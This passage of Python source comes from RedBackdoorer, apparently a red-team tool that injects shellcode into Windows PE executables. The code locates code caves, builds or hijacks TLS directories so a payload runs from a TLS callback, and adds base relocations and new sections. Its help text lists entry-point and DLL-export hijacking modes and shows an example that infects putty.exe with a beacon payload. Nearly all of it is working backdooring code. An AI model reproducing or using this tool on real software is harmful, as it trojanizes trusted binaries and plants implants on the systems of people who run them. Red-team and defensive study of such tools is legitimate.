        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size += sizeOfReloc

        # VirtualAddress
        self.pe.set_dword_at_rva(addr + relocsSize, pageRva)

        # SizeOfBlock
        self.pe.set_dword_at_rva(addr + relocsSize + 4, sizeOfReloc)

        self.logger.dbg(f'Adding {len(relocs)} relocations for Page RVA 0x{pageRva:x} - size of block: 0x{sizeOfReloc:x}')

        i = 0
        for reloc in relocs:
            reloc_offset = (reloc - pageRva)
            reloc_type = imageBaseRelocType << 12

            relocWord = (reloc_type | reloc_offset)
            self.pe.set_word_at_rva(relocDirRva + relocsSize + 8 + i * 2, relocWord)
            self.logger.dbg(f'\tReloc{i} for addr 0x{reloc:x}: 0x{relocWord:x} - 0x{reloc_offset:x} - type: {imageBaseRelocType}')
            i += 1

    def findCave(self, section, size, skip = 0):
        dataSect = section.get_data()

        num = len(dataSect) - size
        found = 0
        while num > 0:
            subsect = dataSect[num : num + size]
            if all(v == 0 for v in subsect):
                found += 1
                if skip == 0:
                    return num + section.VirtualAddress

                elif skip > 0 and found > skip:
                    return num + section.VirtualAddress

            num -= self.ptrSize

        self.logger.fatal(f'Could not find suitable code/data cave in section {section.Name.decode().strip()}!')
        return -1

    def injectTls(self):
        rdataIndex = -1
        dataIndex = -1
        imageBase = self.pe.OPTIONAL_HEADER.ImageBase
        shellcodeAddr = self.pe.get_rva_from_offset(self.shellcodeOffset) + imageBase

        tlsDirRva = 0

        if not hasattr(self.pe, 'DIRECTORY_ENTRY_TLS'):

            sizeOfTls = 4 * self.ptrSize + 2 * 4
            sizeOfTotalTls = sizeOfTls + 2 * self.ptrSize

            self.logger.info('Input PE file does not have TLS directory. Creating one...')
            
            rdataIndex = self.getSectionIndexByName(".rdata")
            if rdataIndex == -1:
                #
                # IMAGE_TLS_DIRECTORY should reside in .rdata section.
                #

                self.logger.dbg('Creating .rdata section to fit TLS directory structure...')
                self.pe.write(self.outfile)
                self.pe.close()

                out = self.addNewPESection(self.outfile, '.rdata', b'\0' * sizeOfTotalTls, characteristics = 0x40000040)

                with open(self.outfile, 'rb') as f:
                    self.pe = pefile.PE(data = f.read(), fast_load = False)
                    self.pe.parse_data_directories()
            else:
                self.logger.dbg('Adding TLS directory structure to .rdata...')

            dataIndex = self.getSectionIndexByName(".data")
            if dataIndex == -1:
                #
                # IMAGE_TLS_DIRECTORY AddressOfIndex should reside in .data section.
                #

                self.logger.dbg('Creating .data section to fit TLS Index variable...')
                self.pe.write(self.outfile)
                self.pe.close()

                out = self.addNewPESection(self.outfile, '.data', b'\0' * sizeOfTotalTls, characteristics = 0xC0000040)

                with open(self.outfile, 'rb') as f:
                    self.pe = pefile.PE(data = f.read(), fast_load = False)
                    self.pe.parse_data_directories()
            else:
                self.logger.dbg('Setting TLS AddressOfIndex to .data...')

            if rdataIndex == -1 or dataIndex == -1:
                self.logger.dbg('Creating .tls section to fit TLS directory structure...')
                self.pe.write(self.outfile)
                self.pe.close()

                sizeOfTotalTls = sizeOfTls + 6 * self.ptrSize

                out = self.addNewPESection(self.outfile, '.tls', b'\0' * sizeOfTotalTls, characteristics = 0xC0000040)

                with open(self.outfile, 'rb') as f:
                    self.pe = pefile.PE(data = f.read(), fast_load = False)
                    self.pe.parse_data_directories()

                rawDataPos  = self.pe.sections[-1].VirtualAddress
                dataSectPos = self.pe.sections[-1].VirtualAddress + 1 * self.ptrSize
                tlsDirRva   = self.pe.sections[-1].VirtualAddress + 3 * self.ptrSize

            else:
                rawDataPos = self.findCave(self.pe.sections[rdataIndex], self.ptrSize, 0)
                dataSectPos = self.findCave(self.pe.sections[dataIndex], 2 * self.ptrSize, 0)
                tlsDirRva = self.findCave(self.pe.sections[rdataIndex], sizeOfTotalTls, 1)

                self.pe.set_bytes_at_rva(rawDataPos, b'\0' * 1 * self.ptrSize)
                self.pe.set_bytes_at_rva(dataSectPos, b'\0' * 2 * self.ptrSize)
                self.pe.set_bytes_at_rva(tlsDirRva, b'\0' * sizeOfTotalTls)

            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = tlsDirRva
            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_TLS].Size = sizeOfTls

            StartAddressOfRawData   = imageBase + rawDataPos
            EndAddressOfRawData     = imageBase + rawDataPos + 1
            AddressOfIndex          = imageBase + dataSectPos
            AddressOfCallBacks      = imageBase + tlsDirRva + sizeOfTls

            relocs = (
                tlsDirRva + 0 * self.ptrSize,
                tlsDirRva + 1 * self.ptrSize,
                tlsDirRva + 2 * self.ptrSize,
                tlsDirRva + 3 * self.ptrSize,
                AddressOfCallBacks - imageBase,
            )

            pageRva = 4096 * int((AddressOfCallBacks - imageBase) / 4096)
            self.addImageBaseRelocations(pageRva, relocs)

            self.pe.parse_data_directories(directories = [PeBackdoor.IMAGE_DIRECTORY_ENTRY_TLS, ])
            self.pe.DIRECTORY_ENTRY_TLS.struct.StartAddressOfRawData = StartAddressOfRawData
            self.pe.DIRECTORY_ENTRY_TLS.struct.EndAddressOfRawData = EndAddressOfRawData
            self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfIndex = AddressOfIndex
            self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks = AddressOfCallBacks
            self.pe.DIRECTORY_ENTRY_TLS.struct.SizeOfZeroFill = 0
            self.pe.DIRECTORY_ENTRY_TLS.struct.Characteristics = 0x100000

            if self.arch == 'x64':
                self.pe.set_qword_at_rva(self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfIndex - imageBase, 0)

            else:
                self.pe.set_dword_at_rva(self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfIndex - imageBase, 0)

            self.logger.dbg('Adding ImageBase relocation to created AddressOfIndex and AddressOfCallBacks fields.')

        elif self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0:
            self.logger.info('Input file already has TLS directory entry. Will backdoor it.')
            tlsDirRva = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress

            relocs = (
                self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks - imageBase,
            )

            pageRva = 4096 * int((self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks - imageBase) / 4096)
            self.addImageBaseRelocations(pageRva, relocs)

        else:
            self.logger.fatal('Could not detect TLS structure presence!')

        if self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks != 0:
            if self.arch == 'x64':
                self.pe.set_qword_at_rva(self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks - imageBase, shellcodeAddr)

            else:
                self.pe.set_dword_at_rva(self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks - imageBase, shellcodeAddr)

        tls_struct = self.pe.DIRECTORY_ENTRY_TLS.struct.__pack__()
        self.pe.set_bytes_at_offset(tlsDirRva, tls_struct)

        self.logger.ok('Shellcode will launch from an injected TLS Callback')
        return True


    #
    # Based on magnificent work by Joxean Koret:
    #   https://github.com/joxeankoret/tahh/blob/master/evasion/SectionDoubleP.py
    #

    def removePESection(self, filename, sectName):
        pe = None
        try:
            pe = pefile.PE(filename)
            sections = SectionDoubleP(pe)

            if pe.sections[-1].Name.decode().startswith(sectName):
                self.logger.info('File already contained injected PE section. Overriding it...')
                sections.pop_back()
                pe.write(filename)

            return True

        except Exception as e:
            self.logger.err(f'Could not remove PE section! Error: {e}')
            return False

        finally:
            if pe:
                pe.close()

    def addNewPESection(self, filename, sectName, sectionData, characteristics = 0x60000020):    
        self.logger.info('Adjusting resulted PE file headers to insert additional PE section') 

        self.removePESection(filename, sectName)

        pe = None
        try:
            # 0x60000020: IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
            # 0xC0000040: IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
            # 0x40000040: IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
            # 0xE0000020: IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE

            pe = pefile.PE(filename)
            name = sectName.encode() + ((8 - len(sectName)) * b'\x00')

            sections = SectionDoubleP(pe)

            pe = sections.push_back(
                Name = name,
                Characteristics = characteristics, 
                Data = sectionData
            )

            pe.write(filename)

            self.logger.ok(f'New section named "{sectName}" added.')
            return True

        except SectionDoublePError as e:
            self.logger.err('Exception occured while injecting a new PE section: ' + str(e))
            sys.exit(1)
            return False

        except Exception as e:
            self.logger.err(f'Could not append PE section! Error: {e}')
            return False

        finally:
            if pe:
                pe.close()

def opts(argv):
    global options

    epilog = '''
------------------

PE Backdooring <mode> consists of two comma-separated options.
First one denotes where to store shellcode, second how to run it:

<mode>

    save,run
      |   |
      |   +---------- 1 - change AddressOfEntryPoint
      |               2 - hijack branching instruction at Original Entry Point (jmp, call, ...)
      |               3 - setup TLS callback
      |               4 - hijack branching instruction at DLL Exported function (use -e to specify export to hook)
      |               
      +-------------- 1 - store shellcode in the middle of a code section
                      2 - append shellcode to the PE file in a new PE section
Example:

    py RedBackdoorer.py 1,2 beacon.bin putty.exe putty-infected.exe

------------------
'''

    o = argparse.ArgumentParser(
        usage = 'RedBackdoorer.py [options] <mode> <shellcode> <infile>',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog = textwrap.dedent(epilog)
    )
    
    req = o.add_argument_group('Required arguments')
    req.add_argument('mode', help = 'PE Injection mode, see help epilog for more details.')
    req.add_argument('shellcode', help = 'Input shellcode file')
    req.add_argument('infile', help = 'PE file to backdoor')
    
    opt = o.add_argument_group('Optional arguments')
    opt.add_argument('-o', '--outfile', metavar='PATH', default='', help = 'Path where to save backdoored output file. If not given, will modify infile.')
    opt.add_argument('-v', '--verbose', action='store_true', help = 'Verbose mode.')

    bak = o.add_argument_group('Backdooring options')
    bak.add_argument('-n', '--section-name', metavar='NAME', default=DefaultSectionName, 
        help = 'If shellcode is to be injected into a new PE section, define that section name. Section name must not be longer than 7 characters. Default: ' + DefaultSectionName)
    bak.add_argument('-i', '--ioc', metavar='IOC', default='', help = 'Append IOC watermark to injected shellcode to facilitate implant tracking.')
    bak.add_argument('-e', '--export', metavar='NAME', default='', help = 'When backdooring DLLs, this specifies name of the exported function to hijack.')

    sign = o.add_argument_group('Authenticode signature options')
    sign.add_argument('-r', '--remove-signature', action='store_true', help = 'Remove PE Authenticode digital signature since its going to be invalidated anyway.')

    args = o.parse_args()
    options.update(vars(args))

    if ',' not in args.mode:
        Logger.fatal(f'<mode> must consist of two comma-separated parts: save,run . See help message epilog for more details.')

    if len(args.section_name) > 7:
        Logger.fatal('--section-name must not be longer than 7 characters!')

    return args

def main(argv):

    try:
        print('''

     ██▀███ ▓█████▓█████▄                                                       
    ▓██ ▒ ██▓█   ▀▒██▀ ██▌                                                      
    ▓██ ░▄█ ▒███  ░██   █▌                                                      
    ▒██▀▀█▄ ▒▓█  ▄░▓█▄   ▌                                                      
    ░██▓ ▒██░▒████░▒████▓                                                       
    ░ ▒▓ ░▒▓░░ ▒░ ░▒▒▓  ▒                                                       
      ░▒ ░ ▒░░ ░  ░░ ▒  ▒                                                       
      ░░   ░   ░   ░ ░  ░                                                       
     ▄▄▄▄   ▄▄▄░  ░  ▄████▄  ██ ▄█▓█████▄ ▒█████  ▒█████  ██▀███ ▓█████ ██▀███  
    ▓█████▄▒████▄  ░▒██▀ ▀█  ██▄█▒▒██▀ ██▒██▒  ██▒██▒  ██▓██ ▒ ██▓█   ▀▓██ ▒ ██▒
    ▒██▒ ▄█▒██  ▀█▄ ▒▓█    ▄▓███▄░░██   █▒██░  ██▒██░  ██▓██ ░▄█ ▒███  ▓██ ░▄█ ▒
    ▒██░█▀ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄░▓█▄   ▒██   ██▒██   ██▒██▀▀█▄ ▒▓█  ▄▒██▀▀█▄  
    ░▓█  ▀█▓▓█   ▓██▒ ▓███▀ ▒██▒ █░▒████▓░ ████▓▒░ ████▓▒░██▓ ▒██░▒████░██▓ ▒██▒
    ░▒▓███▀▒▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓▒▒▒▓  ▒░ ▒░▒░▒░░ ▒░▒░▒░░ ▒▓ ░▒▓░░ ▒░ ░ ▒▓ ░▒▓░
    ▒░▒   ░  ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░░ ▒  ▒  ░ ▒ ▒░  ░ ▒ ▒░  ░▒ ░ ▒░░ ░  ░ ░▒ ░ ▒░
     ░    ░  ░   ▒  ░       ░ ░░ ░ ░ ░  ░░ ░ ░ ▒ ░ ░ ░ ▒   ░░   ░   ░    ░░   ░ 
     ░           ░  ░ ░     ░  ░     ░       ░ ░     ░ ░    ░       ░  ░  ░     
          ░         ░              ░                                            
                              
''')
    except:
        print('''

    :: RedBackdoorer
''')

    print(r'''    Your finest PE backdooring companion.
    Mariusz Banach / mgeeky '22, (@mariuszbit)
    <mb@binary-offensive.com>
    ''')


    args = opts(argv)
    if not args:
        return False

    outfile = ''
    temp = None

    if len(args.outfile) > 0:
        outfile = args.outfile

    else:
        temp = tempfile.NamedTemporaryFile(delete=False)
        shutil.copy(args.infile, temp.name)
        outfile = temp.name
        Logger.dbg(f'Outfile is a temporary file: {outfile}')

    saveModeS, runModeS = args.mode.split(',')

    saveMode = 0
    runMode = 0

    try:
        saveMode = int(saveModeS)
        runMode = int(runModeS)
    except:
        Logger.fatal(f'<mode> must consist of two comma-separated parts: save,run . See help message epilog for more details.')

    peinj = PeBackdoor(options, Logger)
    result = peinj.backdoor(saveMode, runMode, args.shellcode, args.infile, outfile)

    if result :
        if len(args.outfile) > 0:
            Logger.ok(f'Backdoored PE file saved to: {args.outfile}')
        else:
            shutil.copy(outfile, args.infile)
            Logger.ok(f'Backdoored PE file in place.')
    else:
        Logger.fatal('Could not backdoor input PE file!')

    if temp:
        Logger.dbg('Removing temporary file...')
        temp.close()
        os.unlink(temp.name)

if __name__ == '__main__':
    main(sys.argv)
